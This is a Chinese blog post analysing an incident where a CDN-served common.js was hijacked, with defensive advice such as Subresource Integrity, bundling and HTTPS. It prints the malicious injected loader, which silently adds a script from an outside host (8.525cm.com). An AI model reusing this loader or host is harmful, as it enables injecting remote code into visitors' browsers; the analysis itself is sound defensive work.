<!DOCTYPE html><html lang="en-US"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title>记一次CDN中JS资源被劫持的事故分析(附代码解析) | Ox333333</title><meta name="description" content="This post gives a detailed analysis on an incident that Azure CDN resources were hijacked by a malicious JavaScript file."><meta name="keywords"><meta name="subtitle" content="In Pursuit of Absolute Simplicity"><meta name="author" content="Ox333333"><meta name="google-site-verification" content="cvPAyZ-ZCL95oXwVejN2W-cxTBfUemEGQOnHKDEQ8Dk"><meta name="msvalidate.01" content="31FA25C5697C3CA088656A9B63A9013F"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="og:site_name" content="Ox333333"><meta name="og:type" content="website"><meta name="og:title" content="记一次CDN中JS资源被劫持的事故分析(附代码解析)"><meta name="og:descricption" content="This post gives a detailed analysis on an incident that Azure CDN resources were hijacked by a malicious JavaScript file."><meta name="og:url" content="https://zpjiang.me/2016/03/29/cdn-js-hijacking/"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="记一次CDN中JS资源被劫持的事故分析(附代码解析)"><meta name="twitter:description" content="This post gives a detailed analysis on an incident that Azure CDN resources were hijacked by a malicious JavaScript file."><meta name="twitter:site" content="@Ox333333"><meta name="twitter:url" content="https://zpjiang.me/2016/03/29/cdn-js-hijacking/"><link rel="canonical" href="https://zpjiang.me/2016/03/29/cdn-js-hijacking/"><link rel="short icon" href="/favicon.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="search" type="application/opensearchdescription+xml" href="http://zpjiang.me/atom.xml" title="Ox333333"><meta name="generator" content="Hexo 5.4.0"></head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/favicon.png"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">ARCHIVE</a></li><li class="nav-list-item"><a href="/about/" target="_self" class="nav-list-link">ABOUT</a></li><li class="nav-list-item"><a href="https://blog.1pixel.cc" target="_blank" class="nav-list-link">TRAVEL</a></li><li class="nav-list-item"><a href="https://1pixel.cc" target="_blank" class="nav-list-link">PHOTOGRAPHY</a></li><li class="nav-list-item"><a href="/atom.xml" target="_self" class="nav-list-link">RSS</a></li></ul></header><section class="container"><div class="post"><article class="post-block"><h1 class="post-title">记一次CDN中JS资源被劫持的事故分析(附代码解析)</h1><div class="post-info">Mar 29, 2016</div><div class="post-content"><style>
  .container img {
    -webkit-box-shadow: 0 0 12px rgba(0, 0, 0, .8);
    -moz-box-shadow:0 0 12px rgba(0, 0, 0, .8);
    box-shadow:0 0 12px rgba(0, 0, 0, .8);
  }
  img[alt~="small"] {
    width: 400px;
  }
  img[alt~="medium"] {
    width: 550px;
  }
</style>

<p>事情源自今天公司发生了一件事情，因为工作关系所以背景内容就不细讲，不过这里有人几天前遇到了同样的问题：<a target="_blank" rel="noopener" href="http://www.cnblogs.com/july4/p/5338681.html">偷天换日：网络劫持，网页js被伪装替换</a>。以此为例，来吐槽吐槽这个hijacking的“黑客”水平有多烂。</p>
<span id="more"></span>
<h2 id="事故分析"><a href="#事故分析" class="headerlink" title="事故分析"></a>事故分析</h2><p>我把劫持被替换掉的脚本贴出来，上文中对方遇到的问题是<code>common.js</code>，与我们的情况类似。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">document</span>.getElementById(<span class="string">&quot;mck0&quot;</span>)) &#123;</span><br><span class="line">    <span class="keyword">var</span> s0 = <span class="string">&quot;http://xxx.xd618.com/resources/js/common.js?&quot;</span> + <span class="keyword">new</span> <span class="built_in">Date</span>().getTime(),</span><br><span class="line">    s1 = <span class="string">&quot;http://8.525cm.com/v2/v.php?id=01&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> ar = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">2</span>);</span><br><span class="line">    ar[<span class="number">0</span>] = s0;</span><br><span class="line">    ar[<span class="number">1</span>] = s1;</span><br><span class="line">    <span class="keyword">var</span> h = <span class="built_in">document</span>.getElementsByTagName(<span class="string">&#x27;head&#x27;</span>).item(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; ++i) &#123;</span><br><span class="line">      <span class="keyword">var</span> sc = <span class="built_in">document</span>.createElement(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">      sc.type = <span class="string">&quot;text/javascript&quot;</span>;</span><br><span class="line">      sc.id = <span class="string">&quot;mck&quot;</span> + i;</span><br><span class="line">      sc.src = ar[i];</span><br><span class="line">      h.appendChild(sc);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span>(e) &#123;&#125;</span><br></pre></td></tr></table></figure>
<p>从这段脚本我们大致可以看出，显示判断是否有id为<code>mck0</code>的标签（我试着google<code>mck0</code>的意思，无果），如果没有则会向DOM中添加两个script标签。说实话这js写得真是烂，既然用了Array，for循环的时候还把循环次数写死了。而且，js是创建数组居然还是用<code>new Array()</code>，亲，ES2016都快要火起来了。这里安利一下Airbnb的 <a target="_blank" rel="noopener" href="https://github.com/airbnb/javascript#arrays">JavaScript Style Guide</a>，至于为什么推崇使用<code>[]</code>，参考<a target="_blank" rel="noopener" href="http://stackoverflow.com/questions/7375120/why-is-arr-faster-than-arr-new-array">Why is arr = [] faster than arr = new Array?</a>。</p>
<p>扯远了，回到这段脚本，数组中存了两个地址，一个是<code>common.js</code>的地址，一个是指向<code>8.525cm.com</code>的一个地址。</p>
<p>先说第一个，脚本作者可谓良苦用心，为了隐藏自己，虽然替换了<code>common.js</code>，但还是希望网页是可以顺利访问的，所以重新添加了一个能够正常访问的<code>common.js</code>的资源，后面加了日期的后缀用来区分。这作者实在是自作聪明啊。</p>
<p>对于一个稍微有点规模的前端项目而言，核心的几个lib都是会被其他的lib依赖的，你倒好，篡改了<code>common.js</code>，然后在<code>HEAD</code>标签里面append新的<code>&lt;script&gt;</code>标签，亲，你这是插到最后去了你知道吗？你让别的库怎么依赖你这个插进去的<code>common.js</code>？你找一下<code>head</code>里面第一个<code>scirpt</code>出现的位置，用<code>insertBefore</code>这个函数就可插到最前面了。</p>
<p>话说回来，也不能怪这个“黑客”水平太烂，主要是国内很多前端开发的水平也不够，现在有很多支持js动态加载的工具，如鼎鼎有名的<code>RequireJS</code>，国内做前端开发的，好多外包公司能简单就简单，能糊弄就糊弄。当然了，前端工程师如果觉得这个太难上手，用个主流的打包工具打个包总归很简单的吧，<code>Webpack</code>随便玩。要是觉得这个还太难，用<code>Gulp</code>把js合并混淆一下，要是负点责任加个hash的版本号，这些总归很简单了吧。</p>
<p>补充说明，其实这里用打包工具跟依赖工具，其实都只是增加了“黑客”修改脚本的难度，理论上他们还是可以实现文件替换的，比较保险的做法是在后端做CheckSum，不管是CDN上的资源，还是自己服务器的资源，提供一个API使得前端在加载了资源后，与后端记录的CheckSum值进行对比，验证文件的一致性。另外，还可以对dom的append操作做一些检测，比如监听并阻止外部append行为等等。</p>
<p>接下来再说说黑客添加的那个ip地址，<code>http://8.525cm.com/v2/v.php?id=01</code>，第一个反应是去看看是啥，不出所料，暂时啥都没有。可以理解，现在如果就暴露了狼子野心岂不是太没劲？第二个反应就是去查一下whois，搜出来结果如下:</p>
<p><img src="https://raw.githubusercontent.com/0x333333/hexo_img/master/Screen%20Shot%202016-04-06%20at%2022.23.59.png" alt="small"></p>
<p>呵呵，这个<code>HICHINA ZHICHENG TECHNOLOGY LTD</code>也实在太霸气，名字里都敢带国名。不搜不知道，这公司可是大名鼎鼎的 <a target="_blank" rel="noopener" href="https://www.hichina.com/">万网-阿里云旗下品牌</a>，吓出一身冷汗（大家自己脑补）。</p>
<p>当然，这里不排除万网自己批量买了一堆这种垃圾域名，再转手给别人，但这种事情就不怕自己背黑锅？whois里面可是登记着你们公司的大名呢。这里面究竟孰是孰非，看官们自己定夺吧，网上似乎也有人遇到过类似的问题：<a target="_blank" rel="noopener" href="https://www.zhihu.com/question/30344129">知乎：中国万网枝城科技有限公司（HICHINA ZHICHENG TECHNOLOGY LTD.）是什么公司？</a>。</p>
<p>网上关于525cm的资料甚少，只有之前一篇博客里面提到，看来他们也是刚刚开始的这轮攻击，暂时他们还没有什么动作，但一旦对方开挂，加载个木马或者钓鱼页面，骗你密码没商量。这种欺骗更可恶的在于，browser里面的地址确实是合理地址，一般人不开Console根本不知道自己看到的是不是原本网站的真面目，真是细思恐极。</p>
<h2 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h2><p>对这17行代码，也算是挖出了不少东西，目前还没有机会去服务器上看看这些静态资源的改动记录。这段脚本能够给出正确的资源的地址，要么这个“黑客”知道源站资源与CDN节点的匹配关系，要么就是CDN节点感染，”黑客“写了个脚本自动生成。目前我还没拿到服务器访问权限，不然我真想进去捣鼓捣鼓这些文件的修改记录、CDN访问记录之类的，用 <a target="_blank" rel="noopener" href="http://www.imdb.com/title/tt4158110/">Mr. Robot</a> 的话讲，</p>
<blockquote>
<p>再怎么聪明的黑客，都是会忍不住炫耀一番，在服务器上留下蛛丝马迹。</p>
</blockquote>
<p>总的来说，一方面CDN厂商需要加强安全防范，另一方面网站的开发人员还是要多留个心眼，不要随随便便被这种水平的”黑客”给黑了。而对于这些网站的开发商，不要不舍得花钱，买个https的Certificate一年要不了多少钱，把SSL用起来，黑客如果拿到了数据，敲诈你的数目可比买个证书贵多了。</p>
<h2 id="Workaround补充"><a href="#Workaround补充" class="headerlink" title="Workaround补充"></a>Workaround补充</h2><p>对于不使用HTTPS服务的网站，可以采用以下工具在一定程度上增加劫持的难度：</p>
<p><strong>治标方法一</strong></p>
<ul>
<li><p>合并网站的所有JS文件，<a target="_blank" rel="noopener" href="https://www.npmjs.com/package/gulp-concat">gulp-concat</a>，一旦合并了文件，就不可能再出现对于单文件劫持的情况。另外一个好处是，合并后文件加载仅需一个HTTP请求，所以也能提高网站的加载速度。需要注意的是，合并时要保证原有的依赖顺序，如JQuery Plugin一定要在JQuery后面。（当然了，攻击者也可以直接对合并后的文件做替换，于是便有了文件名混淆）</p>
</li>
<li><p>对原JS文件名进行混淆，可以利用 <a target="_blank" rel="noopener" href="https://www.npmjs.com/package/gulp-rename">gulp-rename</a> 工具。根据之前劫持的情况，劫持的行为均发生在JQuery.js、Common.js等常见的基础依赖的库，因此混淆JS文件名一定程度上可以增加劫持的难度。（当然了，攻击者也可以先分析HTML中的<code>&lt;script&gt;</code>标签，动态实现文件替换，这种情况指标方法二）</p>
</li>
<li><p>(optional)为了实现hash后的文件名自动添加到HTML的 <code>&lt;script&gt;</code> 标签中，可以使用 <a target="_blank" rel="noopener" href="https://www.npmjs.com/package/gulp-inject">gulp-inject</a> 工具，这样做简化了流程并避免了手误。</p>
</li>
<li><p>(optional) 为了避免暴露常见JS库，还可以通过使用 <a target="_blank" rel="noopener" href="http://requirejs.org/">RequireJS</a> 来动态异步加载JS包，所有的JS依赖关系可以在定义的main.js 文件中进行配置。</p>
</li>
</ul>
<p><strong>治标方法二</strong></p>
<p>使用 <a target="_blank" rel="noopener" href="https://w3c.github.io/webappsec-subresource-integrity/">Subresource Integrity</a>，这是W3C推荐的专用来检测CDN文件匹配的技术，官方文档参见 <a target="_blank" rel="noopener" href="https://w3c.github.io/webappsec-subresource-integrity/">Subresource Integrity</a>，Mozilla社区的文档参见 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity">SubResource Integrity</a>，使用方法很简单，计算出文件的hash值，写在html标签中，当浏览器加载了相应的 <code>&lt;script&gt;</code> 或 <code>&lt;link&gt;</code> 文件后，会自动计算文件的hash值并做比较。缺点是，暂时不支持IE和Safari，目前支持的浏览器如下所示：</p>
<iframe src="http://caniuse.com/#feat=subresource-integrity" width="100%" height="500" frameborder="0" allowtransparency="true"></iframe>


<p><strong>小结</strong></p>
<p>当然，这些都只是在一定程度上增加了文件劫持的难度，对常规的劫持手段做了预防，但劫持者只要分析了前端代码，还是可以找到相应的攻击手段的。治本的方法还是通过开通HTTPS服务，才能从根本上解决问题。</p>
</div></article></div></section><footer><div class="paginator"><a href="/2016/03/29/Git-Command-Note-Uncompleted/" class="prev">上一篇</a><a href="/2016/03/19/Code-Editor-Customization-Note/" class="next">下一篇</a></div><div id="disqus_thread"></div><script>var disqus_shortname = 'zhipeng';
var disqus_identifier = '2016/03/29/cdn-js-hijacking/';
var disqus_title = '记一次CDN中JS资源被劫持的事故分析(附代码解析)';
var disqus_url = 'http://zpjiang.me/2016/03/29/cdn-js-hijacking/';
(function() {
    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
})();</script><script id="dsq-count-scr" src="//zhipeng.disqus.com/count.js" async></script><div class="copyright"><p>2013 - 2021 | <a href="http://zpjiang.me">Ox333333</a> <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/3.0/">| CC BY-NC-SA</a></p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.6.1/MathJax.js?config=TeX-MML-AM_CHTML"></script><script async data-ad-client="ca-pub-9383149074803575" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"UA-47515905-1",'auto');ga('send','pageview');</script></body></html>